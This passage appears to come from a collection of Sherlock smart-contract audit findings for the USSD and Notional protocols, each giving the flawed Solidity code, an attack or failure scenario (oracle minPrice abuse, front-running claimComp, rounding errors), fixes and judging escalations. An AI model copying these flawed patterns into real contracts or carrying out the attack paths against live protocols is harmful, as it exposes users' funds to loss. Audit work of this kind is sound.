{\n  // Sell collateral for DAI\n}\nelse {\n // No need to swap DAI\n}\n```\n\nDiscussion\n0xRobocop\nEscalate for 10 USDC\nThis is not a duplicate of #111\nThis issue points to an inconsistency in handling DAI as a collateral during peg-down recovery scenarios. The contract will try to sell DAI, but DAI does not have a sell path, so the transaction will revert.\n```\nif (collateralval > amountToBuyLeftUSD) {\n   // sell a portion of collateral and exit\n   if (collateral[i].pathsell.length > 0) {\n       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n       uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   } \n   else {\n       // no need to swap DAI\n       DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n   }\n}\n\nelse {\n   // @audit-issue Not handling the case where this is DAI as is done above.\n   // sell all or skip (if collateral is too little, 5% treshold)\n   if (collateralval >= amountToBuyLeftUSD / 20) {\n      uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n      // sell all collateral and move to next one\n      IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n      amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n      DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   }\n}\n```\n\nSee the inconsistency on the upper `if` and `else` branches. The `else` branch may try to sell DAI, but DAI does not have a sell path.\nsherlock-admin\nEscalate for 10 USDC\nThis is not a duplicate of #111\nThis issue points to an inconsistency in handling DAI as a collateral during peg-down recovery scenarios. The contract will try to sell DAI, but DAI does not have a sell path, so the transaction will revert.\n`if` (collateralval > amountToBuyLeftUSD) {\n   // sell a portion of collateral and exit\n   `if` (collateral[i].pathsell.length > 0) {\n       uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n       uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n       IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n       amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n       DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   } \n   `else` {\n       // no need to swap DAI\n       DAItosell = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * amountToBuyLeftUSD / collateralval;\n   }\n}\n\n`else` {\n   // @audit-issue Not handling the case where this is DAI as is done above.\n   // sell all or skip (if collateral is too little, 5% treshold)\n   `if` (collateralval >= amountToBuyLeftUSD / 20) {\n      uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD);\n      // sell all collateral and move to next one\n      IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, IERC20Upgradeable(collateral[i].token).balanceOf(USSD));\n      amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n      DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore);\n   }\n}\nSee the inconsistency on the upper `if` and `else` branches. The `else` branch may try to sell DAI, but DAI does not have a sell path.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nhrishibhat\n@ctf-sec\nhrishibhat\nResult: Medium Has duplicates\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\n0xRobocop: acceptedчA re-balancing on a peg-down recovery will fail if the `collateralval` of DAI is less than `amountToBuyLeftUSD` but greater than `amountToBuyLeftUSD` / 20 since the DAI collateral does not have a sell path.\nCode Snippet\nTool used\nManual Review
Risk of Incorrect Asset Pricing by StableOracle in Case of Underlying Aggregator Reaching minAnswerчmediumч"```\nfunction latestRoundData(\n  address base,\n  address quote\n)\n  external\n  view\n  override\n  checkPairAccess()\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  )\n{\n  uint16 currentPhaseId = s_currentPhaseId[base][quote];\n  AggregatorV2V3Interface aggregator = _getFeed(base, quote);\n  require(address(aggregator) != address(0), ""Feed not found"");\n  (\n    roundId,\n    answer,\n    startedAt,\n    updatedAt,\n    answeredInRound\n  ) = aggregator.latestRoundData();\n  return _addPhaseIds(roundId, answer, startedAt, updatedAt, answeredInRound, currentPhaseId);\n}\n```\n"ч"Chainlink aggregators have a built-in circuit breaker to prevent the price of an asset from deviating outside a predefined price range. This circuit breaker may cause the oracle to persistently return the minPrice instead of the actual asset price in the event of a significant price drop, as witnessed during the LUNA crash.\n```\nfunction latestRoundData(\n  address base,\n  address quote\n)\n  external\n  view\n  override\n  checkPairAccess()\n  returns (\n    uint80 roundId,\n    int256 answer,\n    uint256 startedAt,\n    uint256 updatedAt,\n    uint80 answeredInRound\n  )\n{\n  uint16 currentPhaseId = s_currentPhaseId[base][quote];\n  AggregatorV2V3Interface aggregator = _getFeed(base, quote);\n  require(address(aggregator) != address(0), ""Feed not found"");\n  (\n    roundId,\n    answer,\n    startedAt,\n    updatedAt,\n    answeredInRound\n  ) = aggregator.latestRoundData();\n  return _addPhaseIds(roundId, answer, startedAt, updatedAt, answeredInRound, currentPhaseId);\n}\n```\n\nChainlinkFeedRegistry#latestRoundData extracts the linked aggregator and requests round data from it. If an asset's price falls below the minPrice, the protocol continues to value the token at the minPrice rather than its real value. This discrepancy could have the protocol end up minting drastically larger amount of stableCoinAmount as well as returning a much bigger collateral factor.\nFor instance, if TokenA's minPrice is $1 and its price falls to $0.10, the aggregator continues to report $1, rendering the related function calls to entail a value that is ten times the actual value.\nIt's important to note that while Chainlink oracles form part of the OracleAggregator system and the use of a combination of oracles could potentially prevent such a situation, there's still a risk. Secondary oracles, such as Band, could potentially be exploited by a malicious user who can DDOS relayers to prevent price updates. Once the price becomes stale, the Chainlink oracle's price would be the sole reference, posing a significant risk."чStableOracle should cross-check the returned answer against the minPrice/maxPrice and revert if the answer is outside of these bounds:\n```\n    (, int256 price, , uint256 updatedAt, ) = registry.latestRoundData(\n        token,\n        USD\n    );\n    \n    if (price >= maxPrice or price <= minPrice) revert();\n```\n\nThis ensures that a false price will not be returned if the underlying asset's value hits the minPrice.чIn the event of an asset crash (like LUNA), the protocol can be manipulated to handle calls at an inflated price.\nCode Snippet\nTool used\nManual Review
`BuyUSSDSellCollateral()` always sells 0 amount if need to sell part of collateralчmediumч```\n    function rebalance() override public {\n      uint256 ownval = getOwnValuation(); // it low enough to dive into if statement (see line below) \n      (uint256 USSDamount, uint256 DAIamount) = getSupplyProportion(); // (3000e6 USSD, 2000e18 DAI)\n      if (ownval < 1e6 - threshold) {\n        // peg-down recovery\n        BuyUSSDSellCollateral((USSDamount - DAIamount / 1e12)/2); //  500 * 1e6     = (3000e6 - 2000e18 / 1e12) / 2\n```\nчDue to rounding error there is misbehaviour in `BuyUSSDSellCollateral()` function. It results in selling 0 amount of collateral.\nSuppose the only collateral in protocol is 1 WBTC; 1 WBTC costs 30_000 USD; UniV3Pool DAI/ USSD has following liquidity: (3000e6 USSD, 2000e18 DAI) And also USSD is underpriced so call rebalance:\n```\n    function rebalance() override public {\n      uint256 ownval = getOwnValuation(); // it low enough to dive into if statement (see line below) \n      (uint256 USSDamount, uint256 DAIamount) = getSupplyProportion(); // (3000e6 USSD, 2000e18 DAI)\n      if (ownval < 1e6 - threshold) {\n        // peg-down recovery\n        BuyUSSDSellCollateral((USSDamount - DAIamount / 1e12)/2); //  500 * 1e6     = (3000e6 - 2000e18 / 1e12) / 2\n```\n\nTake a look into BuyUSSDSellCollateral (follow comments):\n```\n    function BuyUSSDSellCollateral(uint256 amountToBuy) internal { // 500e6\n      CollateralInfo[] memory collateral = IUSSD(USSD).collateralList();\n      //uint amountToBuyLeftUSD = amountToBuy * 1e12 * 1e6 / getOwnValuation();\n      uint amountToBuyLeftUSD = amountToBuy * 1e12; // 500e18\n      uint DAItosell = 0;\n      // Sell collateral in order of collateral array\n      for (uint256 i = 0; i < collateral.length; i++) {\n        // 30_000e18 = 1e8 * 1e18 / 10**8 * 30_000e18 / 1e18\n        uint256 collateralval = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * 1e18 / (10**IERC20MetadataUpgradeable(collateral[i].token).decimals()) * collateral[i].oracle.getPriceUSD() / 1e18;\n        if (collateralval > amountToBuyLeftUSD) {\n          // sell a portion of collateral and exit\n          if (collateral[i].pathsell.length > 0) {\n            uint256 amountBefore = IERC20Upgradeable(baseAsset).balanceOf(USSD); // 0\n            // amountToSellUnits = 1e8 * ((500e18 * 1e18 / 30_000e18) / 1e18) / 1e18 = 1e8 * (0) / 1e18 = 0\n            uint256 amountToSellUnits = IERC20Upgradeable(collateral[i].token).balanceOf(USSD) * ((amountToBuyLeftUSD * 1e18 / collateralval) / 1e18) / 1e18;\n            // and finally executes trade of 0 WBTC\n            IUSSD(USSD).UniV3SwapInput(collateral[i].pathsell, amountToSellUnits);\n            amountToBuyLeftUSD -= (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore); // 0 = 0 - 0\n            DAItosell += (IERC20Upgradeable(baseAsset).balanceOf(USSD) - amountBefore); // 0 += 0\n            // rest of code\n```\n\nSo protocol will not buy DAI and will not sell DAI for USSD in UniswapV3Pool to support peg of USSD to DAIчRefactor formula of amountToSellUnits\n```\n// uint256 amountToSellUnits = (decimals of collateral) * (DAI amount to get for sell) / (price of 1 token of collateral)\nuint256 amountToSellUnits = collateral[i].token).decimals() * amountToBuyLeftUSD / collateral[i].oracle.getPriceUSD()\n```\n\nDiscussion\nT1MOH593\nEscalate for 10 USDC\nThis is not a duplicate of #111 This report describes that partially collateral can't be sold, because `amountToSellUnits` is 0 due to rounding issue. Noticed #183 is similar to my issue\nsherlock-admin\nEscalate for 10 USDC\nThis is not a duplicate of #111 This report describes that partially collateral can't be sold, because `amountToSellUnits` is 0 due to rounding issue. Noticed #183 is similar to my issue\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nctf-sec\nI agree this issue and #183 are not duplicate of #111 and can be grouped together as a new valid medium, will see if this is a duplicate of other issue\nhrishibhat\nResult: Medium Has duplicates\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\nT1MOH593: acceptedчProtocol is not able of partial selling of collateral for token. It block algorithmic pegging of USSD to DAI\nCode Snippet\nTool used\nManual Review, VS Code
If collateral factor is high enough, flutter ends up being out of boundsчmediumч```\nuint256 cf = IUSSD(USSD).collateralFactor();\nuint256 flutter = 0;\nfor (flutter = 0; flutter < flutterRatios.length; flutter++) {\n if (cf < flutterRatios[flutter]) {\n   break;\n }\n}\n```\nчIn `USSDRebalancer` contract, function `SellUSSDBuyCollateral` will revert everytime a rebalance calls it, provided the collateral factor is greater than all the elements of the `flutterRatios` array.\nFunction `SellUSSDBuyCollateral` calculates `flutter` as the lowest index of the `flutterRatios` array for which the collateral factor is smaller than the `flutter` ratio.\n```\nuint256 cf = IUSSD(USSD).collateralFactor();\nuint256 flutter = 0;\nfor (flutter = 0; flutter < flutterRatios.length; flutter++) {\n if (cf < flutterRatios[flutter]) {\n   break;\n }\n}\n```\n\nThe problem arises when, if collateral factor is greater than all flutter values, after the loop `flutter = flutterRatios.length`.\nThis `flutter` value is used afterwards here:\n```\n// rest of code\nif (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n  portions++;\n}\n// rest of code\n```\n\nAnd here:\n```\n// rest of code\nif (collateralval * 1e18 / ownval < collateral[i].ratios[flutter]) {\n if (collateral[i].token != uniPool.token0() || collateral[i].token != uniPool.token1()) {\n   // don't touch DAI if it's needed to be bought (it's already bought)\n   IUSSD(USSD).UniV3SwapInput(collateral[i].pathbuy, daibought/portions);\n }\n}\n// rest of code\n```\n\nAs we can see in the tests of the project, the flutterRatios array and the collateral `ratios` array are set to be of the same length, so if flutter = flutterRatios.length, any call to that index in the `ratios` array will revert with an index out of bounds.чWhen checking `collateral[i].ratios[flutter]` always check first that flutter is `< flutterRatios.length`.\nDiscussion\nneumoxx\nsherlock-admin\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\nctf-sec\nhere\n```\n    function setFlutterRatios(uint256[] calldata _flutterRatios) public onlyControl {\n      flutterRatios = _flutterRatios;\n    }\n```\n\nflutterRatios can be adjusted by admin\nValid low\nhrishibhat\nResult: Medium Has duplicates This is a valid issue where the rebalance reverts in certain conditions due to the unexpected final loop flutter values.\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\nneumoxx: acceptedчHigh, when the collateral factor reaches certain level, a rebalance that calls `SellUSSDBuyCollateral` will always revert.\nCode Snippet\nTool used\nManual review.
claimCOMPAndTransfer() COMP may be locked into the contractчhighч```\n    function claimCOMPAndTransfer(address[] calldata cTokens)\n        external\n        override\n        onlyManagerContract\n        nonReentrant\n        returns (uint256)\n    {\n        uint256 balanceBefore = COMP.balanceOf(address(this));\n        COMPTROLLER.claimComp(address(this), cTokens);\n        uint256 balanceAfter = COMP.balanceOf(address(this));\n\n        // NOTE: the onlyManagerContract modifier prevents a transfer to address(0) here\n        uint256 netBalance = balanceAfter.sub(balanceBefore);   //<-------@only transfer out `netBalance`\n        if (netBalance > 0) {\n            COMP.safeTransfer(msg.sender, netBalance);\n        }\n\n        // NOTE: TreasuryManager contract will emit a COMPHarvested event\n        return netBalance;\n```\nч"Malicious users can keep front-run `claimCOMPAndTransfer()` to trigger `COMPTROLLER.claimComp()` first, causing `netBalance` in `claimCOMPAndTransfer()` to be 0 all the time, resulting in `COMP` not being transferred out and locked in the contract\n`claimCOMPAndTransfer()` use for ""Claims COMP incentives earned and transfers to the treasury manager contract"" The code is as follows:\n```\n    function claimCOMPAndTransfer(address[] calldata cTokens)\n        external\n        override\n        onlyManagerContract\n        nonReentrant\n        returns (uint256)\n    {\n        uint256 balanceBefore = COMP.balanceOf(address(this));\n        COMPTROLLER.claimComp(address(this), cTokens);\n        uint256 balanceAfter = COMP.balanceOf(address(this));\n\n        // NOTE: the onlyManagerContract modifier prevents a transfer to address(0) here\n        uint256 netBalance = balanceAfter.sub(balanceBefore);   //<-------@only transfer out `netBalance`\n        if (netBalance > 0) {\n            COMP.safeTransfer(msg.sender, netBalance);\n        }\n\n        // NOTE: TreasuryManager contract will emit a COMPHarvested event\n        return netBalance;\n```\n\nFrom the above code, we can see that this method only turns out the difference value `netBalance` But `COMPTROLLER.claimComp()` can be called by anyone, if there is a malicious user front-run this transcation to triggers `COMPTROLLER.claimComp()` first This will cause thenetBalance to be 0 all the time, resulting in `COMP` not being transferred out and being locked in the contract.\n```\n    function claimComp(address holder, CToken[] memory cTokens) public { //<----------anyone can call it\n        address[] memory holders = new address[](1);\n        holders[0] = holder;\n        claimComp(holders, cTokens, true, true);\n    }\n```\n"чTransfer all balances, not using `netBalance`\nDiscussion\nJiaren-tang\n.\nJiaren-tang\nEscalate for 10 USDC. do not think this can be a high vulnerability because of the following reason\nthis is a medium because first, the protocol can use flashbot to avoid frontrunning\nthis is loss of reward not lose of user fund\nthis griefing attack has no gain from attacker at all\nhttps://docs.sherlock.xyz/audits/judging/judging\nMedium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost. The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future. The more expensive the attack is for an attacker, the less likely it will be included as a Medium (holding all other factors constant). The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nwe consider the attack is cost high becaues the attacker needs to monitor the pending claim transaction from notional side while has no economic gain\nsherlock-admin\nEscalate for 10 USDC. do not think this can be a high vulnerability because of the following reason\nthis is a medium because first, the protocol can use flashbot to avoid frontrunning\nthis is loss of reward not lose of user fund\nthis griefing attack has no gain from attacker at all\nhttps://docs.sherlock.xyz/audits/judging/judging\nMedium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost. The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future. The more expensive the attack is for an attacker, the less likely it will be included as a Medium (holding all other factors constant). The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nwe consider the attack is cost high becaues the attacker needs to monitor the pending claim transaction from notional side while has no economic gain\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n0xleastwood\nEscalate for 10 USDC. do not think this can be a high vulnerability because of the following reason\nthis is a medium because first, the protocol can use flashbot to avoid frontrunning\nthis is loss of reward not lose of user fund\nthis griefing attack has no gain from attacker at all\nhttps://docs.sherlock.xyz/audits/judging/judging\nMedium: There is a viable scenario (even if unlikely) that could cause the protocol to enter a state where a material amount of funds can be lost. The attack path is possible with assumptions that either mimic on-chain conditions or reflect conditions that have a reasonable chance of becoming true in the future. The more expensive the attack is for an attacker, the less likely it will be included as a Medium (holding all other factors constant). The vulnerability must be something that is not considered an acceptable risk by a reasonable protocol team.\nwe consider the attack is cost high becaues the attacker needs to monitor the pending claim transaction from notional side while has no economic gain\nI disagree, `COMP` rewards continuously accrue over time and hence this function can be called at any time to lose rewards. This attack is not expensive at all to perform and can be profitable in other ways that aren't immediately apparent. The difference between `high` and `medium` risk within the context of Sherlock's judging is `There is a viable scenario (even if unlikely)` vs `This vulnerability would result in a material loss of funds, and the cost of the attack is low (relative to the amount of funds lost)`. It is clear that this fits the criteria of the latter.\nTrumpero\nAgree with the comment by Leastwood, this issue should be high\nhrishibhat\nResult: High Has duplicates Given that the rewards are an integral part of protocol these would be stuck in the contract due to the exploit considering this as a valid high\nsherlock-admin\nEscalations have been resolved successfully!\nEscalation status:\nShadowForce: rejectedч`COMP` may be locked into the contract\nCode Snippet\nTool used\nManual Review
repayAccountPrimeDebtAtSettlement() user lost residual cashчhighч```\n    function repayAccountPrimeDebtAtSettlement(\n        PrimeRate memory pr,\n        VaultStateStorage storage primeVaultState,\n        uint16 currencyId,\n        address vault,\n        address account,\n        int256 accountPrimeCash,\n        int256 accountPrimeStorageValue\n    ) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n// rest of code\n\n            if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n                // If the net debt change is greater than the debt held by the account, then only\n                // decrease the total prime debt by what is held by the account. The residual amount\n                // will be refunded to the account via a direct transfer.\n                netPrimeDebtChange = accountPrimeStorageValue;\n                finalPrimeDebtStorageValue = 0;\n\n                int256 primeCashRefund = pr.convertFromUnderlying(\n                    pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue)) //<--------@audit always ==0\n                );\n                TokenHandler.withdrawPrimeCash(\n                    account, currencyId, primeCashRefund, pr, false // ETH will be transferred natively\n                );\n                didTransfer = true;\n            } else {\n```\nчin `repayAccountPrimeDebtAtSettlement()` Incorrect calculation of `primeCashRefund` value (always == 0) Resulting in the loss of the user's residual cash\nwhen settle Vault Account will execute settleVaultAccount()->repayAccountPrimeDebtAtSettlement() In the `repayAccountPrimeDebtAtSettlement()` method the residual amount will be refunded to the user The code is as follows.\n```\n    function repayAccountPrimeDebtAtSettlement(\n        PrimeRate memory pr,\n        VaultStateStorage storage primeVaultState,\n        uint16 currencyId,\n        address vault,\n        address account,\n        int256 accountPrimeCash,\n        int256 accountPrimeStorageValue\n    ) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n// rest of code\n\n            if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n                // If the net debt change is greater than the debt held by the account, then only\n                // decrease the total prime debt by what is held by the account. The residual amount\n                // will be refunded to the account via a direct transfer.\n                netPrimeDebtChange = accountPrimeStorageValue;\n                finalPrimeDebtStorageValue = 0;\n\n                int256 primeCashRefund = pr.convertFromUnderlying(\n                    pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue)) //<--------@audit always ==0\n                );\n                TokenHandler.withdrawPrimeCash(\n                    account, currencyId, primeCashRefund, pr, false // ETH will be transferred natively\n                );\n                didTransfer = true;\n            } else {\n```\n\nFrom the above code we can see that there is a spelling error\nnetPrimeDebtChange = accountPrimeStorageValue;\nprimeCashRefund = netPrimeDebtChange.sub(accountPrimeStorageValue) so primeCashRefund always ==0\nshould be `primeCashRefund = netPrimeDebtRepaid - accountPrimeStorageValue`ч```\n    function repayAccountPrimeDebtAtSettlement(\n        PrimeRate memory pr,\n        VaultStateStorage storage primeVaultState,\n        uint16 currencyId,\n        address vault,\n        address account,\n        int256 accountPrimeCash,\n        int256 accountPrimeStorageValue\n    ) internal returns (int256 finalPrimeDebtStorageValue, bool didTransfer) {\n// rest of code\n\n            if (netPrimeDebtRepaid < accountPrimeStorageValue) {\n                // If the net debt change is greater than the debt held by the account, then only\n                // decrease the total prime debt by what is held by the account. The residual amount\n                // will be refunded to the account via a direct transfer.\n                netPrimeDebtChange = accountPrimeStorageValue;\n                finalPrimeDebtStorageValue = 0;\n\n                int256 primeCashRefund = pr.convertFromUnderlying(\n-                   pr.convertDebtStorageToUnderlying(netPrimeDebtChange.sub(accountPrimeStorageValue))\n+                   pr.convertDebtStorageToUnderlying(netPrimeDebtRepaid.sub(accountPrimeStorageValue)) \n                );\n                TokenHandler.withdrawPrimeCash(\n                    account, currencyId, primeCashRefund, pr, false // ETH will be transferred natively\n                );\n                didTransfer = true;\n            } else {\n```\nч`primeCashRefund` always == 0 , user lost residual cash\nCode Snippet\nTool used\nManual Review
`VaultAccountSecondaryDebtShareStorage.maturity` will be cleared prematurelyчhighч```\nstruct VaultAccountSecondaryDebtShareStorage {\n    // Maturity for the account's secondary borrows. This is stored separately from\n    // the vault account maturity to ensure that we have access to the proper state\n    // during a roll borrow position. It should never be allowed to deviate from the\n    // vaultAccount.maturity value (unless it is cleared to zero).\n    uint40 maturity;\n    // Account debt for the first secondary currency in either fCash or pCash denomination\n    uint80 accountDebtOne;\n    // Account debt for the second secondary currency in either fCash or pCash denomination\n    uint80 accountDebtTwo;\n}\n```\nч`VaultAccountSecondaryDebtShareStorage.maturity` will be cleared prematurely during liquidation\nIf both the `accountDebtOne` and `accountDebtTwo` of secondary currencies are zero, Notional will consider both debt shares to be cleared to zero, and the maturity will be cleared as well as shown below.\n`VaultLiquidationAction.deleverageAccount` function\nWithin the `VaultLiquidationAction.deleverageAccount` function, it will call the `_reduceAccountDebt` function.\nReferring to the `_reduceAccountDebt` function below. Assume that the `currencyIndex` reference to a secondary currency. In this case, the else logic in Line 251 will be executed. An important point to take note of that is critical to understand this bug is that only ONE of the prime rates will be set as it assumes that the other prime rate will not be used (Refer to Line 252 - 255). However, this assumption is incorrect.\nAssume that the `currencyIndex` is `1`. Then `netUnderlyingDebtOne` parameter will be set to a non-zero value (depositUnderlyingInternal) at Line 261 while `netUnderlyingDebtTwo` parameter will be set to zero at Line 262. This is because, in Line 263 of the `_reduceAccountDebt` function, the `pr[0]` will be set to the prime rate, while the `pr[1]` will be zero or empty. It will then proceed to call the `VaultSecondaryBorrow.updateAccountSecondaryDebt`\nWithin the `updateAccountSecondaryDebt` function, at Line 272, assume that `accountStorage.accountDebtTwo` is `100`. However, since `pr[1]` is not initialized, the `VaultStateLib.readDebtStorageToUnderlying` will return a zero value and set the `accountDebtTwo` to zero.\nAssume that the liquidator calls the `deleverageAccount` function to clear all the debt of the `currencyIndex` secondary currency. Line 274 will be executed, and `accountDebtOne` will be set to zero.\nNote that at this point, both `accountDebtOne` and `accountDebtTwo` are zero. At Line 301, the `_setAccountMaturity` will set the `accountStorage.maturity = 0` , which clears the vault account's maturity.\nAn important point here is that the liquidator did not clear the `accountDebtTwo`. Yet, `accountDebtTwo` became zero in memory during the execution and caused Notional to wrongly assume that both debt shares had been cleared to zero.\nThe final state will be `VaultAccountSecondaryDebtShareStorage` as follows:\n`maturity` and `accountDebtOne` are zero\n`accountDebtTwo` = 100\n```\nstruct VaultAccountSecondaryDebtShareStorage {\n    // Maturity for the account's secondary borrows. This is stored separately from\n    // the vault account maturity to ensure that we have access to the proper state\n    // during a roll borrow position. It should never be allowed to deviate from the\n    // vaultAccount.maturity value (unless it is cleared to zero).\n    uint40 maturity;\n    // Account debt for the first secondary currency in either fCash or pCash denomination\n    uint80 accountDebtOne;\n    // Account debt for the second secondary currency in either fCash or pCash denomination\n    uint80 accountDebtTwo;\n}\n```\n\nFirstly, it does not make sense to have `accountDebtTwo` but no `maturity` in storage, which also means the vault account data is corrupted. Secondly, when `maturity` is zero, it also means that the vault account did not borrow anything from Notional. Lastly, many vault logic would break since it relies on the `maturity` value.\n`VaultLiquidationAction.liquidateVaultCashBalance` function\nThe root cause lies in the implementation of the `_reduceAccountDebt` function. Since `liquidateVaultCashBalance` function calls the `_reduceAccountDebt` function to reduce the debt of the vault account being liquidated, the same issue will occur here.чFetch the prime rate of both secondary currencies because they are both needed within the `updateAccountSecondaryDebt` function when converting debt storage to underlying.\n```\n    function _reduceAccountDebt(\n        VaultConfig memory vaultConfig,\n        VaultState memory vaultState,\n        VaultAccount memory vaultAccount,\n        PrimeRate memory primeRate,\n        uint256 currencyIndex,\n        int256 depositUnderlyingInternal,\n        bool checkMinBorrow\n    ) private {\n        if (currencyIndex == 0) {\n            vaultAccount.updateAccountDebt(vaultState, depositUnderlyingInternal, 0);\n            vaultState.setVaultState(vaultConfig);\n        } else {\n            // Only set one of the prime rates, the other prime rate is not used since\n            // the net debt amount is set to zero\n            PrimeRate[2] memory pr;\n// Remove the line below\n           pr[currencyIndex // Remove the line below\n 1] = primeRate;\n// Add the line below\n     pr = VaultSecondaryBorrow.getSecondaryPrimeRateStateful(vaultConfig);\n\n            VaultSecondaryBorrow.updateAccountSecondaryDebt(\n                vaultConfig,\n                vaultAccount.account,\n                vaultAccount.maturity,\n                currencyIndex == 1 ? depositUnderlyingInternal : 0,\n                currencyIndex == 2 ? depositUnderlyingInternal : 0,\n                pr,\n                checkMinBorrow\n            );\n        }\n    }\n```\nчAny vault logic that relies on the VaultAccountSecondaryDebtShareStorage's maturity value would break since it has been cleared (set to zero). For instance, a vault account cannot be settled anymore as the following `settleSecondaryBorrow` function will always revert. Since `storedMaturity == 0` but `accountDebtTwo` is not zero, Line 399 below will always revert.\nAs a result, a vault account with secondary currency debt cannot be settled. This also means that the vault account cannot exit since a vault account needs to be settled before exiting, causing users' assets to be stuck within the protocol.\nIn addition, the vault account data is corrupted as there is a secondary debt without maturity, which might affect internal accounting and tracking.\nCode Snippet\nTool used\nManual Review
Possible to liquidate past the debt outstanding above the min borrow without liquidating the entire debt outstandingчhighч"```\nrequire(\n    h.debtOutstanding[currencyIndex].sub(depositUnderlyingInternal) < minBorrowSize,\n    ""Must Liquidate All Debt""\n);\n```\n"ч"It is possible to liquidate past the debt outstanding above the min borrow without liquidating the entire debt outstanding. Thus, leaving accounts with small debt that are not profitable to unwind if it needs to liquidate.\n`depositUnderlyingInternal` is always a positive value (Refer to comment on Line 250) that represents the amount of underlying deposited by the liquidator\n`h.debtOutstanding[currencyIndex]` is always a negative value representing debt outstanding of a specific currency in a vault account\n`minBorrowSize` is always a positive value that represents the minimal borrow size of a specific currency (It is stored as uint32 in storage)\nIf liquidating past the debt outstanding above the min borrow, then the entire debt outstanding must be liquidated.\nAssume the following scenario:\n`depositUnderlyingInternal` = `70 USDC`\n`h.debtOutstanding[currencyIndex]` = `-100 USDC`\n`minBorrowSize` = `50 USDC`\nIf the liquidation is successful, the vault account should be left with `-30` USDC debt outstanding because `70 USDC` has been paid off by the liquidator. However, this should not happen under normal circumstances because the debt outstanding (-30) does not meet the minimal borrow size of `50 USDC` and the liquidation should revert/fail.\nThe following piece of validation logic attempts to ensure that all outstanding debt is liquidated if post-liquidation debt does not meet the minimal borrowing size.\n```\nrequire(\n    h.debtOutstanding[currencyIndex].sub(depositUnderlyingInternal) < minBorrowSize,\n    ""Must Liquidate All Debt""\n);\n```\n\nPlugging in the values from our scenario to verify if the code will revert if the debt outstanding does not meet the minimal borrow size.\n```\nrequire(\n (-100 USDC - 70 USDC) < 50 USDC\n);\n===>\nrequire(\n (-170 USDC) < 50 USDC\n);\n===>\nrequire(true) // no revert\n```\n\nThe above shows that it is possible for someone to liquidate past the debt outstanding above the min borrow without liquidating the entire debt outstanding. This shows that the math formula in the code is incorrect and not working as intended."ч"
Cannot permissionless settle the vault account if the user use a blacklisted accountчmediumч"```\n    /// @notice Settles a matured vault account by transforming it from an fCash maturity into\n    /// a prime cash account. This method is not authenticated, anyone can settle a vault account\n    /// without permission. Generally speaking, this action is economically equivalent no matter\n    /// when it is called. In some edge conditions when the vault is holding prime cash, it is\n    /// advantageous for the vault account to have this called sooner. All vault account actions\n    /// will first settle the vault account before taking any further actions.\n    /// @param account the address to settle\n    /// @param vault the vault the account is in\n    function settleVaultAccount(address account, address vault) external override nonReentrant {\n        requireValidAccount(account);\n        require(account != vault);\n\n        VaultConfig memory vaultConfig = VaultConfiguration.getVaultConfigStateful(vault);\n        VaultAccount memory vaultAccount = VaultAccountLib.getVaultAccount(account, vaultConfig);\n        \n        // Require that the account settled, 